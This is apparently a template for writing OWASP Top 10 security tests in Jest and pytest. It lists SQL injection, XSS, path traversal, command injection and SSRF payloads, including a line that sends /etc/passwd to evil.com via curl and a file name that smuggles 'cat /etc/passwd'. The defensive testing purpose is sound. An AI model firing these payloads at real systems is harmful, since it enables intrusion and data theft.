# Security Test Template

This template provides the structure for generating OWASP Top 10 security tests from technical specifications.

## OWASP Top 10 2021 Categories

| ID | Category | Description |
|----|----------|-------------|
| A01 | Broken Access Control | Users can act outside of their intended permissions |
| A02 | Cryptographic Failures | Sensitive data exposure or weak cryptography |
| A03 | Injection | SQL, NoSQL, OS, and LDAP injection vulnerabilities |
| A04 | Insecure Design | Flaws in architecture and design |
| A05 | Security Misconfiguration | Improperly configured security settings |
| A06 | Vulnerable Components | Outdated or vulnerable dependencies |
| A07 | Authentication Failures | Weak identity and authentication controls |
| A08 | Data Integrity Failures | Code and infrastructure integrity issues |
| A09: Security Logging Failures | Insufficient logging and monitoring |
| A10 | Server-Side Request Forgery (SSRF) | SSRF vulnerabilities |

## Common Attack Payloads

### SQL Injection Payloads

```javascript
const sqlInjectionPayloads = [
  "1' OR '1'='1",
  "1' UNION SELECT NULL--",
  "'; DROP TABLE users;--",
  "1' AND 1=1--",
  "admin'--",
  "1' OR 1=1#",
  "'; EXEC xp_cmdshell('dir');--"
];
```

### XSS Payloads

```javascript
const xssPayloads = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "javascript:alert('XSS')",
  "<svg onload=alert('XSS')>",
  "'><script>alert(String.fromCharCode(88,83,83))</script>",
  "<iframe src=\"javascript:alert('XSS')\">",
  "'-alert(1)-'",
  "<body onload=alert('XSS')>"
];
```

### Path Traversal Payloads

```javascript
const pathTraversalPayloads = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  "....//....//....//etc/passwd",
  "%2e%2e%2fetc%2fpasswd",
  "..%252f..%252f..%252fetc%2fpasswd"
];
```

### Command Injection Payloads

```javascript
const commandInjectionPayloads = [
  "; ls -la",
  "| cat /etc/passwd",
  "$(whoami)",
  "`id`",
  "; curl http://evil.com/steal?data=$(cat /etc/passwd)"
];
```

## Jest Security Test Template

### Test Suite Structure

```typescript
/**
 * Security Test Suite
 * OWASP Top 10 Coverage
 * Auto-generated from technical specification
 * Generated: {{TIMESTAMP}}
 */

import { request } from '@/tests/setup';

describe('Security Tests', () => {
  describe('OWASP A03: Injection', () => {
    describe('SQL Injection', () => {
      const sqlInjectionPayloads = [
        "1' OR '1'='1",
        "1' UNION SELECT NULL--",
        "'; DROP TABLE users;--"
      ];

      sqlInjectionPayloads.forEach((payload) => {
        it(`should reject SQL injection payload: ${payload}`, async () => {
          const response = await request(app)
            .post('/api/auth/login')
            .send({ email: payload, password: 'test' });

          expect([400, 401, 403]).toContain(response.status);
        });
      });
    });

    describe('Cross-Site Scripting (XSS)', () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")'
      ];

      xssPayloads.forEach((payload) => {
        it(`should sanitize XSS payload in user input`, () => {
          const { container } = render(<UserProfile name={payload} />);

          // Script tags should not be rendered
          const scripts = container.querySelectorAll('script');
          expect(scripts).toHaveLength(0);

          // Payload should be escaped
          expect(container.innerHTML).not.toContain('<script>');
        });
      });
    });

    describe('Command Injection', () => {
      it('should reject command injection in file names', async () => {
        const maliciousFile = 'test.txt; cat /etc/passwd';

        const response = await request(app)
          .post('/api/files/upload')
          .attach('file', Buffer.from('test'), maliciousFile);

        expect(response.status).toBe(400);
      });
    });
  });

  describe('OWASP A01: Broken Access Control', () => {
    describe('CSRF Protection', () => {
      it('should reject request without CSRF token', async () => {
        const response = await request(app)
          .post('/api/users')
          .send({ name: 'Test' });

        expect([403, 401]).toContain(response.status);
      });

      it('should reject request with invalid CSRF token', async () => {
        const response = await request(app)
          .post('/api/users')
          .set('X-CSRF-Token', 'invalid-token')
          .send({ name: 'Test' });

        expect([403, 401]).toContain(response.status);
      });
    });

    describe('Horizontal Privilege Escalation', () => {
      it('should prevent accessing other users data', async () => {
        const userToken = await authenticateAsRegularUser();

        const response = await request(app)
          .get('/api/users/admin/profile')
          .set('Authorization', `Bearer ${userToken}`);

        expect([403, 404]).toContain(response.status);
      });
    });
  });

  describe('OWASP A07: Authentication Failures', () => {
    describe('Authentication Bypass', () => {
      const bypassAttempts = [
        { username: 'admin', password: 'password' },
        { username: "admin'--", password: 'anything' },
        { username: '', password: '' }
      ];

      bypassAttempts.forEach((attempt) => {
        it(`should reject invalid credentials: ${JSON.stringify(attempt)}`, async () => {
          const response = await request(app)
            .post('/api/auth/login')
            .send(attempt);

          expect([401, 403, 400]).toContain(response.status);
          expect(response.body).not.toHaveProperty('token');
        });
      });
    });

    describe('Account Lockout', () => {
      it('should lock out after multiple failed attempts', async () => {
        const maxAttempts = 5;

        for (let i = 0; i < maxAttempts + 1; i++) {
          const response = await request(app)
            .post('/api/auth/login')
            .send({
              email: 'test@example.com',
              password: 'wrongpassword'
            });

          if (i < maxAttempts) {
            expect([401, 403]).toContain(response.status);
          } else {
            expect(response.status).toBe(429);
          }
        }
      });
    });
  });

  describe('OWASP A02: Cryptographic Failures', () => {
    it('should not expose sensitive data in error messages', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({ email: 'test@example.com', password: 'wrong' });

      expect(response.status).toBe(401);
      expect(response.body.error).not.toMatch(/password/i);
    });

    it('should use HTTPS for production', async () => {
      // This would be an environment check
      const isProduction = process.env.NODE_ENV === 'production';

      if (isProduction) {
        // Verify cookies have Secure flag
        const response = await request(app)
          .post('/api/auth/login')
          .send({ email: 'test@example.com', password: 'password' });

        const setCookie = response.headers['set-cookie'];
        if (setCookie) {
          setCookie.forEach(cookie => {
            if (cookie.includes('auth=')) {
              expect(cookie).toContain('Secure');
            }
          });
        }
      }
    });
  });

  describe('OWASP A10: Server-Side Request Forgery (SSRF)', () => {
    const ssrfPayloads = [
      'http://localhost/admin',
      'http://169.254.169.254/latest/meta-data/',
      'file:///etc/passwd',
      'http://127.0.0.1:22'
    ];

    ssrfPayloads.forEach((url) => {
      it(`should reject SSRF attempt to ${url}`, async () => {
        const response = await request(app)
          .post('/api/proxy')
          .send({ url });

        expect([400, 403, 404]).toContain(response.status);
      });
    });
  });
});
```

## Pytest Security Test Template

```python
"""
Security Test Suite
OWASP Top 10 Coverage
Auto-generated from technical specification
Generated: {TIMESTAMP}
"""

import pytest
from fastapi.testclient import TestClient


class TestSQLInjection:
    """OWASP A03: Injection - SQL Injection"""

    @pytest.fixture
    def sql_injection_payloads(self):
        return [
            "1' OR '1'='1",
            "1' UNION SELECT NULL--",
            "'; DROP TABLE users;--"
        ]

    def test_sql_injection_in_login(self, client: TestClient, sql_injection_payloads):
        """Test SQL injection in login credentials"""
        for payload in sql_injection_payloads:
            response = client.post("/api/auth/login", json={
                "email": payload,
                "password": "test"
            })

            assert response.status_code in [400, 401, 403]
            assert "token" not in response.json()


class TestXSS:
    """OWASP A03: Injection - Cross-Site Scripting"""

    @pytest.fixture
    def xss_payloads(self):
        return [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")'
        ]

    def test_xss_in_user_input(self, client: TestClient, xss_payloads):
        """Test XSS payloads in user input"""
        for payload in xss_payloads:
            response = client.post("/api/users", json={
                "name": payload,
                "email": "test@example.com"
            })

            # Response should contain escaped data
            assert response.status_code == 201
            assert "<script>" not in response.text


class TestCSRF:
    """OWASP A01: Broken Access Control - CSRF"""

    @pytest.fixture
    def csrf_token(self, client: TestClient):
        """Get a valid CSRF token"""
        response = client.get("/api/csrf-token")
        return response.json()["token"]

    def test_csrf_token_required(self, client: TestClient):
        """Test that CSRF token is required"""
        response = client.post("/api/users", json={"name": "Test"})

        assert response.status_code in [403, 401]
        assert "csrf" in response.json().get("detail", "").lower()

    def test_invalid_csrf_token_rejected(self, client: TestClient):
        """Test that invalid CSRF tokens are rejected"""
        response = client.post("/api/users",
                             json={"name": "Test"},
                             headers={"X-CSRF-Token": "invalid"})

        assert response.status_code in [403, 401]


class TestAuthentication:
    """OWASP A07: Authentication Failures"""

    def test_sql_injection_in_login(self, client: TestClient):
        """Test SQL injection in login"""
        response = client.post("/api/auth/login", json={
            "email": "admin'--",
            "password": "anything"
        })

        assert response.status_code in [401, 403]
        assert "token" not in response.json()

    def test_account_lockout(self, client: TestClient):
        """Test account lockout after failed attempts"""
        max_attempts = 5

        for i in range(max_attempts + 1):
            response = client.post("/api/auth/login", json={
                "email": "test@example.com",
                "password": "wrongpassword"
            })

            if i < max_attempts:
                assert response.status_code in [401, 403]
            else:
                assert response.status_code == 429


class TestSSRF:
    """OWASP A10: Server-Side Request Forgery"""

    @pytest.fixture
    def ssrf_payloads(self):
        return [
            'http://localhost/admin',
            'http://169.254.169.254/latest/meta-data/',
            'file:///etc/passwd',
            'http://127.0.0.1:22'
        ]

    def test_ssrf_protection(self, client: TestClient, ssrf_payloads):
        """Test SSRF protection"""
        for url in ssrf_payloads:
            response = client.post("/api/proxy", json={"url": url})

            assert response.status_code in [400, 403, 404]
```

## Security Testing Best Practices

1. **Test During Development**: Write security tests alongside functional tests
2. **Use Realistic Payloads**: Test with actual attack vectors
3. **Cover All Input Vectors**: Test all user input points
4. **Verify Sanitization**: Ensure proper output encoding
5. **Test Authentication**: Verify auth mechanisms thoroughly
6. **Check Authorization**: Test privilege escalation scenarios
7. **Validate Error Messages**: Ensure no sensitive data leaks
8. **Test Rate Limiting**: Verify protection against brute force
9. **Monitor Dependencies**: Scan for vulnerable packages
10. **Regular Updates**: Keep security tests updated with new threats
